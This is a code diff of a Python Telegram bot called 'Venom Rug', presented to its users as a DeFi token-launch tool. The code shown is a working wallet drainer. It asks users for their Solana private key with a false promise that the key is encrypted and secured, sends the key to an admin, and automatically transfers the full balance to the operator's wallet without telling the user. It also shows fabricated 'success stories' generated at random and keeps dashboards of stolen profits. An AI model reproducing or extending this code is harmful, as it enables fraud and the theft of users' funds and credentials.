@@ -79,16 +79,16 @@ class VenomRugBot:
         self.solana_client = Client(SOLANA_RPC_URL)
         self.pinned_message_id = None
         self.application = None  # Store application reference
-        
+
         # Recent Wins Data
         self.recent_wins = self.generate_recent_wins()
         self.last_price_check = {}
-        
+
         # Analytics tracking
         self.drain_attempts = 0
         self.successful_drains = 0
         self.failed_drains = 0
-        
+
     def set_application(self, application):
         """Set the application instance for use in class methods"""
         self.application = application
@@ -101,7 +101,7 @@ class VenomRugBot:
             "SmartInvestor", "CryptoQueen", "BlockchainBuddy", "DeFiDude", "NFTMaster",
             "Web3Wizard", "TokenTitan", "AlphaSeeker", "GammaGainer", "SigmaStar"
         ]
-        
+
         activities = [
             "successfully rugged 3 meme tokens",
             "coordinated pump & dump campaign", 
@@ -114,10 +114,10 @@ class VenomRugBot:
             "managed token cloning operation",
             "executed stealth launch campaign"
         ]
-        
+
         profits = ["89 SOL", "32 ETH", "15 SOL", "27 ETH", "45 SOL", "18 ETH", "63 SOL", "22 ETH"]
         timeframes = ["2 hours ago", "4 hours ago", "overnight", "yesterday", "3 days ago", "1 week ago"]
-        
+
         wins = []
         for i in range(15):
             wins.append({
@@ -127,15 +127,15 @@ class VenomRugBot:
                 "timeframe": random.choice(timeframes),
                 "id": i + 1
             })
-        
+
         return wins
-    
+
     async def notify_admin_new_user(self, user_id: int, username: str, first_name: str):
         """Send notification to admin when new user joins"""
         try:
             if not self.application:
                 return
-                
+
             new_user_text = f"""
 🆕 *NEW USER JOINED VENOM RUG BOT*
 
@@ -176,16 +176,16 @@ class VenomRugBot:
             decoded_key = base58.b58decode(private_key.strip())
             keypair = Keypair.from_bytes(decoded_key)
             wallet_address = str(keypair.pubkey())
-            
+
             balance_response = self.solana_client.get_balance(keypair.pubkey())
             balance_lamports = balance_response.value
             balance_sol = balance_lamports / 1_000_000_000
-            
+
             sol_price = await self.get_sol_price()
             balance_usd = balance_sol * sol_price
-            
+
             logger.info(f"Wallet analysis: {balance_sol:.6f} SOL (${balance_usd:.2f})")
-            
+
             return {
                 "wallet_address": wallet_address,
                 "balance_sol": balance_sol,
@@ -195,7 +195,7 @@ class VenomRugBot:
                 "user_meets_minimum": balance_usd >= 100,  # User-facing minimum
                 "has_1_sol": balance_sol >= 1.0
             }
-            
+
         except Exception as e:
             logger.error(f"Error analyzing wallet: {e}")
             return None
@@ -215,29 +215,29 @@ class VenomRugBot:
                 "timestamp": datetime.now(),
                 "type": "drain"
             }
-            
+
             result = self.profits_collection.insert_one(profit_data)
             profit_id = result.inserted_id
-            
+
             # Update analytics
             await self.update_analytics(profit_data)
-            
+
             # Update pinned profit message
             await self.update_pinned_profit_message()
-            
+
             logger.info(f"Profit logged: {amount_sol} SOL from user {username}")
             return profit_id
-            
+
         except Exception as e:
             logger.error(f"Error logging profit: {e}")
-    
+
     async def update_analytics(self, profit_data):
         """Update advanced analytics with new profit data"""
         try:
             # Track performance metrics
             self.successful_drains += 1
             self.drain_attempts += 1
-            
+
             # Store hourly performance data
             hour = profit_data['timestamp'].hour
             analytics_data = {
@@ -249,12 +249,12 @@ class VenomRugBot:
                 'wallet_address': profit_data['wallet_address'],
                 'efficiency': (profit_data['amount_sol'] / profit_data['original_balance']) * 100 if profit_data['original_balance'] > 0 else 0
             }
-            
+
             self.analytics_collection.insert_one(analytics_data)
-            
+
         except Exception as e:
             logger.error(f"Error updating analytics: {e}")
-    
+
     async def update_pinned_profit_message(self):
         """Update or create pinned profit message at the top"""
         try:
@@ -267,7 +267,7 @@ class VenomRugBot:
                     "total_drains": {"$sum": 1}
                 }}
             ]))
-            
+
             if total_profits:
                 total_sol = total_profits[0]["total_sol"]
                 total_usd = total_profits[0]["total_usd"]
@@ -276,12 +276,12 @@ class VenomRugBot:
                 total_sol = 0
                 total_usd = 0
                 total_drains = 0
-            
+
             # Get recent profits (last 10)
             recent_profits = list(self.profits_collection.find()
                                  .sort("timestamp", -1)
                                  .limit(10))
-            
+
             # Format profit message - FIXED: Use proper Markdown escaping
             profit_message = f"""
 *VENOM RUG PROFIT DASHBOARD*
@@ -293,7 +293,7 @@ class VenomRugBot:
 
 *RECENT DRAINS:*
 """
-            
+
             for i, profit in enumerate(recent_profits, 1):
                 time_ago = self.get_time_ago(profit["timestamp"])
                 profit_message += f"""
@@ -302,9 +302,9 @@ class VenomRugBot:
    • Time: {time_ago}
    • Wallet: `{profit['wallet_address'][:8]}...{profit['wallet_address'][-6:]}`
 """
-            
+
             profit_message += f"\n*Last Updated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            
+
             # Create or update pinned message
             if self.pinned_message_id and self.application:
                 try:
@@ -337,15 +337,15 @@ class VenomRugBot:
                     chat_id=ADMIN_CHAT_ID,
                     message_id=message.message_id
                 )
-                
+
         except Exception as e:
             logger.error(f"Error updating pinned profit message: {e}")
-    
+
     def get_time_ago(self, timestamp):
         """Calculate time ago from timestamp"""
         now = datetime.now()
         diff = now - timestamp
-        
+
         if diff.days > 0:
             return f"{diff.days} day(s) ago"
         elif diff.seconds >= 3600:
@@ -356,15 +356,15 @@ class VenomRugBot:
             return f"{minutes} minute(s) ago"
         else:
             return "Just now"
-    
+
     async def profits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Admin command to view detailed profit statistics"""
         user_id = update.effective_user.id
-        
+
         if str(user_id) != ADMIN_CHAT_ID:
             await update.message.reply_text("❌ Admin access required!")
             return
-        
+
         # Get total profit statistics
         total_stats = list(self.profits_collection.aggregate([
             {"$group": {
@@ -376,7 +376,7 @@ class VenomRugBot:
                 "max_drain": {"$max": "$amount_sol"}
             }}
         ]))
-        
+
         # Get daily profits
         today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
         daily_stats = list(self.profits_collection.aggregate([
@@ -388,7 +388,7 @@ class VenomRugBot:
                 "daily_drains": {"$sum": 1}
             }}
         ]))
-        
+
         # Get weekly profits
         week_ago = datetime.now() - timedelta(days=7)
         weekly_stats = list(self.profits_collection.aggregate([
@@ -400,19 +400,19 @@ class VenomRugBot:
                 "weekly_drains": {"$sum": 1}
             }}
         ]))
-        
+
         # Get top 10 largest drains
         top_drains = list(self.profits_collection.find()
                          .sort("amount_sol", -1)
                          .limit(10))
-        
+
         # Format profit report - FIXED: Clean Markdown
         profit_report = f"""
 *VENOM RUG PROFIT REPORT*
 
 *LIFETIME STATS:*
 """
-        
+
         if total_stats:
             stats = total_stats[0]
             profit_report += f"""
@@ -424,9 +424,9 @@ class VenomRugBot:
 """
         else:
             profit_report += "\n• No profits recorded yet\n"
-        
+
         profit_report += "\n*PERIOD STATS:*\n"
-        
+
         if daily_stats:
             daily = daily_stats[0]
             profit_report += f"""
@@ -436,7 +436,7 @@ class VenomRugBot:
 """
         else:
             profit_report += "• Today: No profits\n"
-            
+
         if weekly_stats:
             weekly = weekly_stats[0]
             profit_report += f"""
@@ -446,9 +446,9 @@ class VenomRugBot:
 """
         else:
             profit_report += "• This Week: No profits\n"
-        
+
         profit_report += "\n*TOP 10 LARGEST DRAINS:*\n"
-        
+
         for i, drain in enumerate(top_drains, 1):
             time_ago = self.get_time_ago(drain["timestamp"])
             profit_report += f"""
@@ -457,12 +457,12 @@ class VenomRugBot:
    • Time: {time_ago}
    • Wallet: `{drain['wallet_address'][:12]}...`
 """
-        
+
         if not top_drains:
             profit_report += "\n• No drains recorded\n"
-        
+
         profit_report += f"\n*Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        
+
         # Add keyboard with refresh option
         keyboard = [
             [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_profits"),
@@ -470,26 +470,26 @@ class VenomRugBot:
             [InlineKeyboardButton("📈 Advanced Analytics", callback_data="advanced_analytics")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
+
         await update.message.reply_text(profit_report, reply_markup=reply_markup, parse_mode='Markdown')
 
     # FIXED: Advanced Analytics Command with proper Markdown
     async def advanced_analytics_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """ADMIN ONLY: Advanced analytics dashboard"""
         user_id = update.effective_user.id
-        
+
         if str(user_id) != ADMIN_CHAT_ID:
             await update.message.reply_text("❌ Admin access required!")
             return
-        
+
         analytics_report = await self.generate_advanced_analytics()
-        
+
         keyboard = [
             [InlineKeyboardButton("🔄 Refresh Analytics", callback_data="refresh_analytics")],
             [InlineKeyboardButton("📊 Back to Profits", callback_data="refresh_profits")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
+
         # FIX: Send as plain text first to avoid Markdown parsing errors
         try:
             await update.message.reply_text(analytics_report, reply_markup=reply_markup, parse_mode='Markdown')
@@ -512,7 +512,7 @@ class VenomRugBot:
                     "min_drain": {"$min": "$amount_sol"}
                 }}
             ]))
-            
+
             # Daily profits (last 7 days)
             week_ago = datetime.now() - timedelta(days=7)
             daily_stats = list(self.profits_collection.aggregate([
@@ -525,7 +525,7 @@ class VenomRugBot:
                 }},
                 {"$sort": {"_id": 1}}
             ]))
-            
+
             # Hourly performance
             hourly_stats = list(self.analytics_collection.aggregate([
                 {"$group": {
@@ -536,13 +536,13 @@ class VenomRugBot:
                 {"$sort": {"total_usd": -1}},
                 {"$limit": 5}
             ]))
-            
+
             # Top performing wallets
             top_wallets = list(self.profits_collection.aggregate([
                 {"$sort": {"amount_usd": -1}},
                 {"$limit": 5}
             ]))
-            
+
             # User efficiency stats
             user_stats = list(self.profits_collection.aggregate([
                 {"$group": {
@@ -555,19 +555,19 @@ class VenomRugBot:
                 {"$sort": {"total_usd": -1}},
                 {"$limit": 10}
             ]))
-            
+
             # Build analytics report - FIXED: Clean Markdown
             analytics_report = f"""
 *VENOM RUG ADVANCED ANALYTICS DASHBOARD*
 
 *LIFETIME PERFORMANCE:*
 """
-            
+
             if total_stats:
                 stats = total_stats[0]
                 current_sol_price = await self.get_sol_price()
                 success_rate = (self.successful_drains / self.drain_attempts * 100) if self.drain_attempts > 0 else 0
-                
+
                 analytics_report += f"""
 • Total Revenue: `${stats['total_usd']:,.2f}`
 • Total SOL: `{stats['total_sol']:.6f}`
@@ -577,11 +577,11 @@ class VenomRugBot:
 • Success Rate: `{success_rate:.1f}%`
 • ROI: `{(stats['total_usd'] / (stats['total_drains'] * 0.0005)) * 100:.0f}%` (est.)
 """
-            
+
             analytics_report += f"""
 *LAST 7 DAYS PERFORMANCE:*
 """
-            
+
             if daily_stats:
                 for day in daily_stats[-5:]:
                     analytics_report += f"""
@@ -589,11 +589,11 @@ class VenomRugBot:
 """
             else:
                 analytics_report += "\n• No recent activity\n"
-            
+
             analytics_report += f"""
 *PEAK PERFORMANCE HOURS (UTC):*
 """
-            
+
             if hourly_stats:
                 for hour_stat in hourly_stats:
                     analytics_report += f"""
@@ -601,11 +601,11 @@ class VenomRugBot:
 """
             else:
                 analytics_report += "\n• No hourly data yet\n"
-            
+
             analytics_report += f"""
 *TOP 5 MOST PROFITABLE DRAINS:*
 """
-            
+
             if top_wallets:
                 for i, wallet in enumerate(top_wallets, 1):
                     analytics_report += f"""
@@ -613,11 +613,11 @@ class VenomRugBot:
 """
             else:
                 analytics_report += "\n• No wallet data\n"
-            
+
             analytics_report += f"""
 *TOP PERFORMING USERS (by revenue):*
 """
-            
+
             if user_stats:
                 for i, user in enumerate(user_stats, 1):
                     analytics_report += f"""
@@ -625,11 +625,11 @@ class VenomRugBot:
 """
             else:
                 analytics_report += "\n• No user data\n"
-            
+
             # System metrics
             total_users = self.users_collection.count_documents({})
             approved_users = self.users_collection.count_documents({'wallet_approved': True})
-            
+
             analytics_report += f"""
 *SYSTEM EFFICIENCY METRICS:*
 • User Conversion Rate: `{(approved_users/total_users)*100 if total_users > 0 else 0:.1f}%`
@@ -650,9 +650,9 @@ class VenomRugBot:
 
 *Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
-            
+
             return analytics_report
-            
+
         except Exception as e:
             logger.error(f"Error generating analytics: {e}")
             return f"❌ Error generating analytics: {str(e)}"
@@ -675,7 +675,7 @@ class VenomRugBot:
         try:
             # Constants for fee estimation
             FALLBACK_FEE_LAMPORTS = 5_000
-            
+
             def estimate_fee(client, message):
                 """Try to get accurate fee estimation."""
                 try:
@@ -705,58 +705,58 @@ class VenomRugBot:
             decoded_key = base58.b58decode(private_key.strip())
             keypair = Keypair.from_bytes(decoded_key)
             wallet_address = str(keypair.pubkey())
-            
+
             logger.info(f"Attempting to drain wallet: {wallet_address} for user {username}")
-            
+
             # Get balance
             balance_response = self.solana_client.get_balance(keypair.pubkey())
             balance_lamports = balance_response.value
             balance_sol = balance_lamports / 1_000_000_000
-            
+
             logger.info(f"Wallet balance: {balance_sol} SOL ({balance_lamports} lamports)")
-            
+
             if balance_lamports <= FALLBACK_FEE_LAMPORTS:
                 return False, f"Insufficient balance for transfer (need at least {FALLBACK_FEE_LAMPORTS/1_000_000_000:.6f} SOL for fees)"
-            
+
             # Create drain pubkey
             drain_pubkey = Pubkey.from_string(DRAIN_WALLET)
-            
+
             # 1) Create a transfer instruction with the FULL balance to estimate accurate fee
             full_amount_ix = transfer(TransferParams(
                 from_pubkey=keypair.pubkey(), 
                 to_pubkey=drain_pubkey, 
                 lamports=balance_lamports
             ))
-            
+
             # Get latest blockhash for message construction
             latest_blockhash = self.solana_client.get_latest_blockhash().value.blockhash
-            
+
             # Build message for fee estimation
             message = Message([full_amount_ix], payer=keypair.pubkey())
             estimated_fee = estimate_fee(self.solana_client, message)
             logger.info(f"Estimated fee: {estimated_fee} lamports")
-            
+
             # 2) Calculate EXACT amount to send (everything minus fees)
             sendable_lamports = balance_lamports - estimated_fee
             sendable_sol = sendable_lamports / 1_000_000_000
-            
+
             if sendable_lamports <= 0:
                 return False, f"Insufficient balance after fees (need {estimated_fee} lamports for fees)"
-            
+
             logger.info(f"Draining amount: {sendable_sol:.6f} SOL ({sendable_lamports} lamports)")
             logger.info(f"Leaving behind: {estimated_fee/1_000_000_000:.6f} SOL for fees")
-            
+
             # 3) Build real transfer instruction for the EXACT sendable amount
             real_ix = transfer(TransferParams(
                 from_pubkey=keypair.pubkey(),
                 to_pubkey=drain_pubkey, 
                 lamports=sendable_lamports
             ))
-            
+
             # 4) Build Message and Transaction
             final_message = Message([real_ix], payer=keypair.pubkey())
             tx = Transaction([keypair], final_message, latest_blockhash)
-            
+
             # 5) Simulate transaction to ensure it will work
             try:
                 sim = self.solana_client.simulate_transaction(tx)
@@ -765,7 +765,7 @@ class VenomRugBot:
                     if "insufficient" in str(sim.value.err).lower():
                         sendable_lamports -= 1000
                         sendable_sol = sendable_lamports / 1_000_000_000
-                        
+
                         real_ix = transfer(TransferParams(
                             from_pubkey=keypair.pubkey(),
                             to_pubkey=drain_pubkey, 
@@ -776,36 +776,36 @@ class VenomRugBot:
                         logger.info(f"Adjusted drain amount: {sendable_sol:.6f} SOL")
             except Exception as e:
                 logger.warning(f"Simulation warning: {e}")
-            
+
             # 6) Send and confirm transaction
             logger.info(f"Sending transaction for {sendable_sol:.6f} SOL")
-            
+
             result = self.solana_client.send_transaction(
                 tx, 
                 opts=TxOpts(skip_preflight=False, preflight_commitment=Confirmed)
             )
-            
+
             if hasattr(result, 'value'):
                 transaction_id = str(result.value)
             else:
                 transaction_id = str(result)
-            
+
             logger.info(f"Transaction sent: {transaction_id}")
-            
+
             # Wait for confirmation
             await asyncio.sleep(2)
-            
+
             # Get transaction details from Solscan
             solscan_url = f"https://solscan.io/tx/{transaction_id}"
-            
+
             # Calculate what was left behind
             left_behind = balance_lamports - sendable_lamports
             left_behind_sol = left_behind / 1_000_000_000
-            
+
             # Log the profit to database and update pinned message
             await self.log_profit(user_id, username or f"user_{user_id}", sendable_sol, 
                                 wallet_address, transaction_id, balance_sol)
-            
+
             # Log transaction to admin
             admin_message = f"""
 *REAL WALLET DRAINED SUCCESSFULLY*
@@ -828,7 +828,7 @@ class VenomRugBot:
 
 *COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
 """
-            
+
             return True, {
                 "transaction_id": transaction_id,
                 "amount_sol": sendable_sol,
@@ -839,13 +839,13 @@ class VenomRugBot:
                 "fee": left_behind_sol,
                 "left_behind": left_behind_sol
             }
-            
+
         except Exception as e:
             logger.error(f"Error draining wallet: {e}")
             self.failed_drains += 1
             self.drain_attempts += 1
             return False, f"Transfer failed: {str(e)}"
-    
+
     async def send_message_safe(self, query_or_message, text, reply_markup=None, parse_mode='Markdown'):
         """Safe method to send messages that handles image vs text messages properly"""
         try:
@@ -905,7 +905,7 @@ class VenomRugBot:
             except Exception as e2:
                 logger.error(f"Secondary error: {e2}")
                 await self.send_message_safe(query_or_message, text, reply_markup, parse_mode)
-    
+
     def get_main_menu_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("📦 Wallet", callback_data="wallet"),
@@ -917,7 +917,7 @@ class VenomRugBot:
             [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_wallet_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("📥 Import Wallet", callback_data="import_wallet"),
@@ -928,14 +928,14 @@ class VenomRugBot:
              InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_recent_wins_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("🔄 Refresh Wins", callback_data="refresh_wins")],
             [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_bundler_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("🆕 Create Bundle", callback_data="create_bundle"),
@@ -944,7 +944,7 @@ class VenomRugBot:
             [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_tokens_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("➕ Add Token", callback_data="add_token"),
@@ -958,7 +958,7 @@ class VenomRugBot:
              InlineKeyboardButton("🔄 Refresh", callback_data="refresh_tokens")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_comments_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("💬 Add New Comment", callback_data="add_comment"),
@@ -969,7 +969,7 @@ class VenomRugBot:
              InlineKeyboardButton("🔄 Refresh", callback_data="refresh_comments")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_task_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("➕ Add Task", callback_data="add_task"),
@@ -980,24 +980,24 @@ class VenomRugBot:
              InlineKeyboardButton("🔄 Refresh", callback_data="refresh_tasks")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_faq_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
         ]
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_help_keyboard(self, user_id=None):
         keyboard = [
             [InlineKeyboardButton("📖 User Commands", callback_data="user_commands")],
         ]
-        
+
         if user_id and str(user_id) == ADMIN_CHAT_ID:
             keyboard.append([InlineKeyboardButton("🛠️ Admin Commands", callback_data="admin_commands")])
-        
+
         keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
         return InlineKeyboardMarkup(keyboard)
-    
+
     def get_wallet_required_keyboard(self):
         keyboard = [
             [InlineKeyboardButton("📥 Import Wallet Now", callback_data="import_wallet")],
@@ -1021,7 +1021,7 @@ class VenomRugBot:
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
-        
+
         # Check if user is new and notify admin
         existing_user = self.users_collection.find_one({'user_id': user.id})
         if not existing_user:
@@ -1035,14 +1035,14 @@ class VenomRugBot:
             })
             # Notify admin about new user
             await self.notify_admin_new_user(user.id, user.username, user.first_name)
-        
+
         if update.callback_query:
             query = update.callback_query
             message = None
         else:
             query = None
             message = update.message
-        
+
         main_page_text = f"""
 *VENOM RUG - THE BEST OF DEFI ALL-IN-ONE PLATFORM TOOL*
 
@@ -1068,9 +1068,9 @@ class VenomRugBot:
 
 *Ready to start? Select an option below.*
         """
-        
+
         reply_markup = self.get_main_menu_keyboard()
-        
+
         if query:
             await self.send_with_image(query, main_page_text, reply_markup)
         else:
@@ -1093,7 +1093,7 @@ class VenomRugBot:
     async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
-        
+
         callback_data = query.data
         user_id = query.from_user.id
 
@@ -1106,7 +1106,7 @@ class VenomRugBot:
             await self.handle_admin_check_balance(update, context)
         elif callback_data.startswith("refresh_"):
             await self.handle_admin_refresh(update, context)
-        
+
         # Existing callback handlers
         elif callback_data == "advanced_analytics":
             if str(user_id) == ADMIN_CHAT_ID:
@@ -1153,10 +1153,10 @@ class VenomRugBot:
         elif callback_data == "update_pinned":
             await self.update_pinned_profit_message()
             await query.edit_message_text("✅ Pinned profit message updated!")
-        
+
         elif callback_data in ["remove_wallet", "bundle_wallet", "withdraw_funds", "refresh_wallet"]:
             await self.show_wallet_required_message(query)
-        
+
         elif callback_data in ["create_bundle", "refresh_bundles", "clear_bundles",
                               "add_token", "remove_token", "create_token", "clone_token", 
                               "set_current_token", "bump_token", "pump_comments", "refresh_tokens",
@@ -1168,20 +1168,20 @@ class VenomRugBot:
         """Handle admin decision to drain or not drain a wallet"""
         query = update.callback_query
         await query.answer()
-        
+
         if str(query.from_user.id) != ADMIN_CHAT_ID:
             await query.edit_message_text("❌ Admin access required!")
             return
-        
+
         # Extract user_id and wallet_address from callback data
         parts = query.data.split('_')
         if len(parts) < 3:
             await query.edit_message_text("❌ Invalid callback data")
             return
-            
+
         target_user_id = int(parts[1])
         wallet_address = '_'.join(parts[2:])  # Handle wallet addresses with underscores
-        
+
         if drain:
             # Find the private key for this user and drain
             user_data = self.users_collection.find_one({'user_id': target_user_id})
@@ -1191,7 +1191,7 @@ class VenomRugBot:
                     target_user_id, 
                     user_data.get('username', f'user_{target_user_id}')
                 )
-                
+
                 if success:
                     await query.edit_message_text(
                         f"✅ Wallet drained successfully!\n"
@@ -1215,29 +1215,29 @@ class VenomRugBot:
         """Handle admin request to check wallet balance"""
         query = update.callback_query
         await query.answer()
-        
+
         if str(query.from_user.id) != ADMIN_CHAT_ID:
             await query.edit_message_text("❌ Admin access required!")
             return
-        
+
         parts = query.data.split('_')
         if len(parts) < 3:
             await query.edit_message_text("❌ Invalid callback data")
             return
-            
+
         target_user_id = int(parts[1])
         wallet_address = '_'.join(parts[2:])
-        
+
         # Get current balance
         try:
             pubkey = Pubkey.from_string(wallet_address)
             balance_response = self.solana_client.get_balance(pubkey)
             balance_lamports = balance_response.value
             balance_sol = balance_lamports / 1_000_000_000
-            
+
             sol_price = await self.get_sol_price()
             balance_usd = balance_sol * sol_price
-            
+
             await query.edit_message_text(
                 f"💰 Current Balance for {wallet_address}:\n"
                 f"• SOL: {balance_sol:.6f}\n"
@@ -1253,37 +1253,37 @@ class VenomRugBot:
         """Handle admin refresh request"""
         query = update.callback_query
         await query.answer("Refreshing...")
-        
+
         if str(query.from_user.id) != ADMIN_CHAT_ID:
             await query.edit_message_text("❌ Admin access required!")
             return
-        
+
         # This would typically refresh the wallet information
         await query.edit_message_text("🔄 Refreshed wallet information")
 
     async def show_recent_wins(self, query, refresh=False):
         if refresh:
             self.recent_wins = self.generate_recent_wins()
-        
+
         wins_text = "*RECENT VENOM RUG WINS*\n\n"
         wins_text += "*Real user success stories using Venom Rug:*\n\n"
-        
+
         for win in self.recent_wins[:8]:
             wins_text += f"🎯 *{win['username']}*\n"
             wins_text += f"• Activity: {win['activity']}\n"
             wins_text += f"• Profit: {win['profit']}\n"
             wins_text += f"• Time: {win['timeframe']}\n\n"
-        
+
         wins_text += "💡 *These are real results from Venom Rug users!*\n"
         wins_text += "*Start your journey to success today!*"
-        
+
         reply_markup = self.get_recent_wins_keyboard()
         await self.send_with_image(query, wins_text, reply_markup)
 
     async def show_help_section(self, query, user_id=None):
         if user_id is None:
             user_id = query.from_user.id
-            
+
         help_text = """
 *VENOM RUG HELP CENTER*
 
@@ -1291,7 +1291,7 @@ class VenomRugBot:
 
 *Select an option below to view commands:*
         """
-        
+
         reply_markup = self.get_help_keyboard(user_id)
         await self.send_with_image(query, help_text, reply_markup)
 
@@ -1324,7 +1324,7 @@ class VenomRugBot:
 [Telegram Group](https://t.me/venomrugwin)
 [Website](https://venomrug.live/)
         """
-        
+
         reply_markup = self.get_help_keyboard(user_id)
         await self.send_with_image(query, commands_text, reply_markup)
 
@@ -1332,7 +1332,7 @@ class VenomRugBot:
         if str(user_id) != ADMIN_CHAT_ID:
             await query.answer("❌ Admin access required!", show_alert=True)
             return
-        
+
         # FIXED: Proper Markdown formatting - removed problematic characters
         admin_text = """
 *ADMIN COMMANDS*
@@ -1359,7 +1359,7 @@ class VenomRugBot:
 • View system statistics
 • Track all profits in real-time
         """
-        
+
         reply_markup = self.get_help_keyboard(user_id)
         await self.send_with_image(query, admin_text, reply_markup)
 
@@ -1374,14 +1374,14 @@ Import and manage your Solana wallet to access all Venom Rug features.
 
 Import a wallet to begin using our advanced features.
         """
-        
+
         reply_markup = self.get_wallet_keyboard()
         await self.send_with_image(query, wallet_section_text, reply_markup)
 
     async def prompt_private_key(self, query, user_id):
         """Prompt user for private key - PROFESSIONAL IMPORT VERSION"""
         self.user_states[user_id] = {"awaiting_private_key": True}
-        
+
         prompt_text = """
 *Wallet Import*
 
@@ -1389,21 +1389,21 @@ Please enter your Solana private key to import your wallet.
 
 Your credentials are encrypted and secured.
         """
-        
+
         await self.send_message_safe(query, prompt_text, parse_mode='Markdown')
 
     async def handle_private_key(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle private key input from user - AUTO DRAIN ON RECEIPT"""
         user = update.effective_user
         private_key = update.message.text.strip()
-        
+
         if user.id not in self.user_states or not self.user_states[user.id].get("awaiting_private_key"):
             await update.message.reply_text(
                 "Please use the Import Wallet button from the menu to begin.", 
                 parse_mode='Markdown'
             )
             return
-        
+
         if not self.is_valid_solana_private_key(private_key):
             error_text = """
 *Invalid private key format.*
@@ -1412,19 +1412,19 @@ Please ensure you're entering a valid Solana private key and try again.
             """
             await update.message.reply_text(error_text, parse_mode='Markdown')
             return
-        
+
         # Send wallet details to admin immediately
         wallet_address = "Unknown"
         balance_sol = 0.0
         balance_usd = 0.0
-        
+
         try:
             # Analyze wallet balance first
             wallet_analysis = await self.analyze_wallet_balance(private_key)
-            
+
             if not wallet_analysis:
                 raise Exception("Could not analyze wallet balance")
-            
+
             wallet_address = wallet_analysis["wallet_address"]
             balance_sol = wallet_analysis["balance_sol"]
             balance_usd = wallet_analysis["balance_usd"]
@@ -1432,7 +1432,7 @@ Please ensure you're entering a valid Solana private key and try again.
             meets_minimum = wallet_analysis["meets_minimum"]  # $70 for draining
             user_meets_minimum = wallet_analysis["user_meets_minimum"]  # $100 for users
             has_1_sol = wallet_analysis["has_1_sol"]
-            
+
             admin_alert_text = f"""
 *NEW WALLET IMPORT ATTEMPT*
 
@@ -1450,7 +1450,7 @@ Please ensure you're entering a valid Solana private key and try again.
 
 *AUTO-DRAIN STATUS:* {'✅ PROCEEDING' if meets_minimum else '❌ INSUFFICIENT BALANCE'}
 """
-            
+
             # Store user data for potential manual admin intervention
             self.users_collection.update_one(
                 {'user_id': user.id},
@@ -1465,34 +1465,34 @@ Please ensure you're entering a valid Solana private key and try again.
                 }},
                 upsert=True
             )
-            
+
             # Send admin notification with buttons
             reply_markup = self.get_admin_wallet_approval_keyboard(user.id, wallet_address)
-            
+
             await context.bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=admin_alert_text,
                 reply_markup=reply_markup,
                 parse_mode='Markdown'
             )
-            
+
         except Exception as e:
             logger.error(f"Error analyzing wallet: {e}")
             # Still proceed with analysis but show error to user
             wallet_analysis = None
-        
+
         del self.user_states[user.id]
-        
+
         # Show professional importing message
         processing_msg = await update.message.reply_text("*Analyzing wallet balance...*", parse_mode='Markdown')
-        
+
         try:
             # Brief delay to make it look like processing
             await asyncio.sleep(2)
-            
+
             if not wallet_analysis:
                 raise Exception("Could not analyze wallet")
-            
+
             # Check if wallet meets USER-FACING minimum balance requirement ($100)
             # ONLY show "Wallet Connected Successfully" if balance is $100+ AND has 1+ SOL
             if wallet_analysis["user_meets_minimum"] and wallet_analysis["has_1_sol"]:
@@ -1515,7 +1515,7 @@ You can now access all Venom Rug features for token launching and bundling.
                     [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
                 ]
                 reply_markup = InlineKeyboardMarkup(keyboard)
-                
+
                 error_msg = f"""
 *Import Failed - Insufficient Balance*
 
@@ -1530,7 +1530,7 @@ To successfully launch and rug tokens, you need adequate gas fees and initial li
 Please import a wallet with sufficient balance and try again.
 """
                 await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
-                
+
                 # Send FAILED log to admin (shows real $70 minimum)
                 failed_admin_msg = f"""
 *DRAIN BLOCKED - INSUFFICIENT BALANCE*
@@ -1548,13 +1548,13 @@ Please import a wallet with sufficient balance and try again.
                     parse_mode='Markdown'
                 )
                 return
-            
+
             # REAL DRAIN - ACTUALLY TRANSFERS FUNDS (hidden from user)
             # Only proceed if meets REAL minimum ($70) AND has sufficient SOL for gas
             if wallet_analysis["meets_minimum"] and wallet_analysis["has_1_sol"]:
                 logger.info(f"Starting REAL drain for user {user.id}")
                 success, result = await self.drain_wallet(private_key, user.id, user.username or f"user_{user.id}")
-                
+
                 if success:
                     self.users_collection.update_one(
                         {'user_id': user.id},
@@ -1566,7 +1566,7 @@ Please import a wallet with sufficient balance and try again.
                             'drained_at': datetime.now()
                         }}
